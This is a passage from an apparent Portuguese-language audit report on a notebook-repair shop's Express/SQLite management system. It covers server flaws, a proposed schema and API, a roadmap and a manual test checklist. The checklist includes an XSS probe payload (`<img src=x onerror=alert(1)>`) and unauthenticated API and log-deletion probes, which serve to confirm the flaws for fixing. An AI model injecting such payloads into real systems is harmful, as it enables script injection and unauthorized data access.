│   ├── api.js           (fetch + tratamento de erro)
│   ├── estado.js        (dados e cache)
│   ├── util.js          (datas, moeda, escape)
│   └── telas/
│       ├── servicos.js
│       ├── financeiro.js
│       ├── estoque.js
│       └── os.js
└── vendor/html2pdf.bundle.min.js
```

Para o tamanho atual, **não precisa migrar para React/Vue**; módulos ES + funções bem separadas resolvem. Se o sistema for crescer (multi-loja, app, vários usuários simultâneos), aí sim vale Vite + React/Vue e uma biblioteca de formulários.

### 6.2 Servidor

- **Sem middleware de erro, sem 404, sem `async` wrapper.** Erros em callbacks são engolidos (os `err` dos `db.all` em `server.js:80-85` são ignorados por sombreamento).
- **Sem transações.** Inserir + logar, excluir + logar: se uma parte falha, o estado fica inconsistente.
- **Sem `PRAGMA foreign_keys = ON`, WAL, `busy_timeout`.** WAL melhora leitura concorrente; `busy_timeout` evita `SQLITE_BUSY`.
- **Sem índices** em `status`, `nome`, `data` — com o tempo, as listagens ficam lentas.
- **Sem paginação**; `/api/dados` devolve o banco inteiro a cada carregamento.
- **Sem validação de entrada** (schema/tipos); o `express.json()` tem limite padrão de 100kb, mas nenhum campo é validado.
- **Sem shutdown gracioso** (`SIGINT`/`SIGTERM` → `db.close()` e `server.close()`).
- **Sem health check** (`/health`) para monitoramento.
- **Sem logs estruturados** (pino/winston); só `console.log`.
- **PORT e caminho do banco hardcoded** (`server.js:6, 13`). Use `.env` (`dotenv`) e `process.env.PORT`.
- **`express.static('public')` sem fallback** e sem cache headers.
- **`app.listen(PORT)`** escuta em `0.0.0.0` por padrão. Se for uso local, `app.listen(PORT, '127.0.0.1')`.

### 6.3 Dependências e empacotamento

- `sqlite3` é um addon nativo: precisa compilar (ou baixar prebuild) em cada máquina. Em Windows sem build tools (Visual Studio Build Tools), a instalação quebra — este ambiente de análise, por exemplo, não conseguiu instalá-la. Alternativas: **`node:sqlite`** (embutido no Node 22+, ainda experimental na 22 e estável nas versões mais recentes; sem compilação) ou **`better-sqlite3`** (maduro, síncrono, mais simples para transações).
- `express` 4.19.2: o Express 5 já é estável; se for atualizar, teste as rotas e o middleware de erro (mudanças em `req.query`, `res.status` etc.).
- `package.json` sem `"private": true`, `"engines"`, licença, repositório e sem scripts de desenvolvimento (`dev` com `node --watch` ou `nodemon`).
- Não há `package-lock.json` nos arquivos enviados; versões flutuantes (`^4.19.2`) podem quebrar builds futuros. Comite o lockfile.
- `html2pdf` vem de CDN, fora do `package.json`: dependência invisível, sem versão travada localmente e sem funcionamento offline.

### 6.4 Testes, lint e CI

- Zero testes. As funções de dinheiro, datas, status e parsing são puras e fáceis de testar com Vitest.
- Nenhum ESLint/Prettier configurado para este projeto (há um `.vscode/settings.json` no repositório, mas isso não é configuração de projeto).
- Nenhum CI (GitHub Actions) rodando lint/testes.
- Um teste de API com Supertest cobriria os fluxos críticos: criar OS, mudar status, excluir, validar tabela inválida, rejeitar não autenticado.
- Um teste E2E com Playwright cobriria: cadastrar serviço → gerar OS → PDF → excluir.

### 6.5 Documentação e operação

- Não há README deste projeto com: como instalar, rodar, onde ficam os dados, como fazer backup, como restaurar, qual navegador usar.
- Não há `.env.example`.
- Não há instruções de deploy (PC da loja? VPS? rede local?) nem de atualização.
- Não há rotina de backup nem de verificação de restauração ("backup que nunca foi testado não é backup").

---

## 7. Modelo de dados sugerido

O schema atual é uma "planilha": tudo em texto, sem relações, sem timestamps. Para o que o sistema faz, um modelo normalizado resolve duplicidade de cliente, histórico de status e vínculo entre OS, peças e financeiro.

```sql
PRAGMA foreign_keys = ON;

CREATE TABLE usuarios (
  id INTEGER PRIMARY KEY,
  nome TEXT NOT NULL,
  email TEXT NOT NULL UNIQUE,
  senha_hash TEXT NOT NULL,
  papel TEXT NOT NULL DEFAULT 'atendente' CHECK (papel IN ('admin', 'atendente')),
  ativo INTEGER NOT NULL DEFAULT 1,
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE clientes (
  id INTEGER PRIMARY KEY,
  nome TEXT NOT NULL,
  telefone TEXT,
  email TEXT,
  documento TEXT,
  endereco TEXT,
  observacoes TEXT,
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE equipamentos (
  id INTEGER PRIMARY KEY,
  cliente_id INTEGER NOT NULL REFERENCES clientes(id),
  marca TEXT,
  modelo TEXT,
  serial TEXT,
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE ordens_servico (
  id INTEGER PRIMARY KEY,
  numero TEXT NOT NULL UNIQUE,
  cliente_id INTEGER NOT NULL REFERENCES clientes(id),
  equipamento_id INTEGER REFERENCES equipamentos(id),
  status TEXT NOT NULL DEFAULT 'Em andamento'
    CHECK (status IN ('Em andamento', 'Pronto', 'Entregue', 'Cancelado')),
  defeito_relatado TEXT,
  diagnostico TEXT,
  garantia_dias INTEGER,
  data_entrada TEXT NOT NULL,
  previsao_entrega TEXT,
  data_entrega TEXT,
  valor_centavos INTEGER NOT NULL DEFAULT 0,
  observacoes TEXT,
  criado_por INTEGER REFERENCES usuarios(id),
  criado_em TEXT NOT NULL DEFAULT (datetime('now')),
  atualizado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE os_itens (
  id INTEGER PRIMARY KEY,
  os_id INTEGER NOT NULL REFERENCES ordens_servico(id) ON DELETE CASCADE,
  descricao TEXT NOT NULL,
  quantidade INTEGER NOT NULL DEFAULT 1,
  valor_unitario_centavos INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE pagamentos (
  id INTEGER PRIMARY KEY,
  os_id INTEGER REFERENCES ordens_servico(id),
  descricao TEXT,
  valor_centavos INTEGER NOT NULL,
  status TEXT NOT NULL DEFAULT 'DEVENDO' CHECK (status IN ('DEVENDO', 'PAGO')),
  vencimento TEXT,
  pago_em TEXT,
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE pecas (
  id INTEGER PRIMARY KEY,
  cliente_id INTEGER REFERENCES clientes(id),
  os_id INTEGER REFERENCES ordens_servico(id),
  descricao TEXT NOT NULL,
  data_entrada TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'Não devolvido'
    CHECK (status IN ('Não devolvido', 'Devolvido')),
  observacoes TEXT
);

CREATE TABLE estoque_notebooks (
  id INTEGER PRIMARY KEY,
  marca TEXT NOT NULL,
  modelo TEXT NOT NULL,
  processador TEXT,
  memoria TEXT,
  tela TEXT,
  bateria TEXT,
  armazenamento TEXT,
  video TEXT,
  preco_centavos INTEGER,
  condicoes_pagamento TEXT,
  status TEXT NOT NULL DEFAULT 'Disponível'
    CHECK (status IN ('Disponível', 'Reservado', 'Vendido')),
  serial TEXT,
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE historico_status_os (
  id INTEGER PRIMARY KEY,
  os_id INTEGER NOT NULL REFERENCES ordens_servico(id) ON DELETE CASCADE,
  status_anterior TEXT,
  status_novo TEXT NOT NULL,
  usuario_id INTEGER REFERENCES usuarios(id),
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE TABLE auditoria (
  id INTEGER PRIMARY KEY,
  usuario_id INTEGER REFERENCES usuarios(id),
  entidade TEXT NOT NULL,
  entidade_id INTEGER,
  acao TEXT NOT NULL CHECK (acao IN ('criar', 'alterar', 'excluir')),
  antes_json TEXT,
  depois_json TEXT,
  criado_em TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX idx_os_status ON ordens_servico(status);
CREATE INDEX idx_os_cliente ON ordens_servico(cliente_id);
CREATE INDEX idx_os_data ON ordens_servico(data_entrada);
CREATE INDEX idx_pag_status ON pagamentos(status);
CREATE INDEX idx_pecas_status ON pecas(status);
CREATE INDEX idx_auditoria_data ON auditoria(criado_em);
```

**Por que vale a pena:**

- Um cliente cadastrado uma vez; OS, peças e pagamentos apontam para ele.
- Histórico de status separado permite saber quando a OS ficou pronta e quanto tempo ficou parada.
- Valores em centavos permitem somas exatas.
- `numero` único acaba com OS duplicada.
- `auditoria` append-only, com usuário e antes/depois, dá trilha confiável.
- `estoque_notebooks.status` permite separar disponível/vendido sem apagar o registro.

Se a migração for grande demais agora, uma versão intermediária já resolve 80%: manter as tabelas atuais, mas adicionar `id` estável, `cmaleta`, `data`/`status` em peças, `valor_centavos`, `criado_em`/`atualizado_em` e uma tabela `os` de verdade.

---

## 8. Arquitetura e API sugeridas

### Estrutura

```
new-star-notebook/
├── src/
│   ├── server.js
│   ├── config.js
│   ├── db/
│   │   ├── index.js
│   │   └── migrations/001-inicial.sql
│   ├── middlewares/  (auth, erros, validacao)
│   ├── rotas/        (auth, clientes, os, estoque, financeiro, pecas, relatorios)
│   └── validators/   (schemas Zod)
├── public/
│   ├── index.html
│   ├── css/
│   ├── js/
│   └── vendor/
├── tests/
├── backups/          (fora do Git)
├── .env.example
├── .gitignore
└── package.json
```

### API

| Método | Rota | Uso |
|---|---|---|
| POST | `/api/login` | autenticar |
| POST | `/api/logout` | encerrar sessão |
| GET | `/api/me` | usuário atual |
| GET/POST | `/api/clientes` | listar/criar clientes |
| GET/PUT/DELETE | `/api/clientes/:id` | editar/excluir |
| GET/POST | `/api/os` | listar (com filtros e paginação) / criar |
| GET/PUT/DELETE | `/api/os/:id` | detalhe/editar/excluir |
| PATCH | `/api/os/:id/status` | mudar status e registrar histórico |
| GET/POST | `/api/os/:id/itens` | itens da OS |
| GET/POST | `/api/pagamentos` | financeiro |
| PATCH | `/api/pagamentos/:id` | marcar pago/devendo |
| GET/POST | `/api/pecas` | peças e fontes |
| GET/POST | `/api/estoque` | notebooks da loja |
| GET | `/api/relatorios/financeiro?de=&ate=` | totais e pendências |
| GET | `/api/backup` | exportar tudo |
| POST | `/api/restore` | importar backup |
| GET | `/health` | health check |

**Regras transversais:** toda rota `/api/*` (exceto login) exige sessão; toda escrita valida schema; toda resposta de erro tem `{ erro: "mensagem" }` e status HTTP correto; toda listagem tem paginação (`?pagina=1&limite=50`) e filtros.

### Front

- Não guarde o banco em arrays globais; mantenha um cache curto e busque do servidor.
- Um `api.js` com `fetch` que lança erro em `!res.ok` e mostra toast.
- Renderização por aba, com `map().join('')`, escape de HTML e delegação de eventos (sem `onclick` inline).
- Estado de carregamento/vazio/erro em cada tabela.
- `switchTab` com hash (`#/financeiro`) para F5 e favoritos funcionarem.

---

## 9. Roadmap sugerido

| Fase | Prazo estimado | Entregas |
|---|---|---|
| **0. Proteger o que existe** | 1 dia | Backup do `localStorage`; `.gitignore`; mover banco para `data/`; corrigir "Imprimir Direto"; colocar `try/catch` no parse e no save |
| **1. Segurança e persistência** | 3–5 dias | Login + sessão + perfis; HTTPS/helmet/rate limit; allowlist de tabelas; API para todas as entidades; migrações; front consumindo a API; importação do JSON antigo |
| **2. Integridade** | 1 semana | Schema normalizado (ou intermediário); validação Zod; centavos; datas ISO; OS única; IDs estáveis; transações; auditoria com usuário; backup automático |
| **3. UX e mobile** | 1 semana | Layout responsivo; tabelas com scroll/cards; toasts e modais; busca com acentos e debounce; estados vazios/loading; abas com hash; acessibilidade (labels, foco, ARIA) |
| **4. Documentos e relatórios** | 3–5 dias | Template de OS separado do formulário; PDF com `@page`/print CSS (ou servidor); etiqueta; relatórios financeiro/estoque; exportação CSV |
| **5. Qualidade e operação** | contínuo | Vitest + Supertest + Playwright; ESLint/Prettier; GitHub Actions; logs estruturados; `/health`; deploy com systemd/PM2; rotina de restore testada |
| **6. Evolução** | depois | PWA/offline real; WhatsApp para avisar "OS pronta"; dashboard por período; multiusuário; integração com estoque/fornecedor |

### Se você só tem um fim de semana

1. Backup + `.gitignore` + banco fora do Git.
2. Corrigir a impressão e o escape de HTML.
3. Criar login simples e restringir a API.
4. Fazer `POST`/`GET`/`PUT`/`DELETE` de **serviços** no servidor e importar o `localStorage` uma vez.
5. Deixar os outros cadastros no `localStorage` **temporariamente**, mas com aviso visível de que são locais.

Isso já elimina a maior parte do risco de perda de dados e de acesso indevido, sem reescrever tudo.

---

## 10. Checklist de testes manuais (para confirmar os problemas)

| # | Cenário | Comportamento atual | Comportamento correto |
|---|---|---|---|
| 1 | Cadastrar serviço e limpar os dados do site | Registro some | Dados vêm do servidor |
| 2 | Abrir em outro navegador | Lista vazia | Mesma lista |
| 3 | Abrir por `file://` e por `http://localhost` | Dois bancos diferentes | Um banco só |
| 4 | Abrir `http://IP:3000/api/dados` de outro PC | JSON completo, sem login | 401 |
| 5 | `DELETE /api/logs/1` | Apaga auditoria | 405/403 |
| 6 | Cadastrar nome `<img src=x onerror=alert(1)>` | Alerta ao abrir a lista | Texto escapado |
| 7 | Clicar "Salvar e Baixar PDF" duas vezes | Duas OS com o mesmo número | Uma OS (ou erro de duplicidade) |
| 8 | Clicar "Imprimir Direto" | Página em branco | OS impressa |
| 9 | Abrir no celular | Layout estourado, rolagem horizontal | Layout em uma coluna |
| 10 | Desligar a internet e gerar PDF | Erro silencioso | Mensagem clara ou PDF local |
| 11 | Editar notebook offline e recarregar | Alteração perdida | Sincronização ou aviso |
| 12 | Excluir notebook offline e recarregar | Item reaparece | Exclusão persistida |
| 13 | Digitar `João` e buscar `joao` | Não encontra | Encontra |
| 14 | Serviço com data de entrada há 6 dias | Pode não marcar atraso (fuso) | Marca atraso |
| 15 | Valor `1.234,56` no financeiro | Campo rejeita/informa errado | `R$ 1.234,56` |
| 16 | Duas abas alterando dados | Uma sobrescreve a outra | Servidor resolve conflito |

---

## 11. Perguntas que mudam a recomendação

1. **A pasta `public/` existe no projeto real?** Se sim, o problema 3.5 é só de organização; se não, o servidor não serve o front.
2. **O sistema roda em um PC só, na rede da loja ou na internet?** Isso define o nível de autenticação/rede necessário.
3. **Quantas pessoas usam ao mesmo tempo?** Uma? Três atendentes? Muda a urgência de servidor/sessão.
4. **Os dados atuais já são de produção?** Se sim, o backup/importação vem antes de qualquer refatoração.
5. **O PDF precisa ser enviado por WhatsApp/e-mail?** Isso muda o formato (link, arquivo, assinatura).
6. **Há requisito fiscal/legal para a OS** (CNPJ, termo de garantia, assinatura do cliente)? O template atual é simples.
7. **Qual o volume esperado?** 100 OS/ano ou 50/dia? Define paginação, índices e escolha do banco.

---

## 12. Conclusão

O New Star Notebook é um sistema **útil e bem pensado para a operação de uma loja de notebooks**: resolve OS, estoque, financeiro, peças e impressão em um único lugar, com uma interface simples. O problema não é a ideia; é a **fundação**: os dados estão no lugar mais frágil possível (o navegador), a API está aberta e o contrato entre front e banco não fecha.

A boa notícia é que a maior parte do esforço já foi feita: as telas existem, os fluxos existem e o schema inicial existe. O caminho mais curto e seguro é:

1. **Backup agora.**
2. **Servidor como fonte da verdade** (com importação do que está no navegador).
3. **Login + HTTPS + allowlist de tabelas.**
4. **Validação, centavos e datas ISO.**
5. **Responsividade e documentos (OS/PDF) bem feitos.**

Feito isso, o sistema deixa de ser um "caderno digital em um navegador" e passa a ser um sistema confiável para a loja — inclusive para abrir em outra máquina, fazer backup e crescer.

---

### Observação sobre o repositório

Os cinco arquivos analisados foram preservados em `new-star-notebook/legacy-versao-1/` para que esta análise fique reproduzível. A versão corrigida está em `new-star-notebook/` (servidor e `public/`).
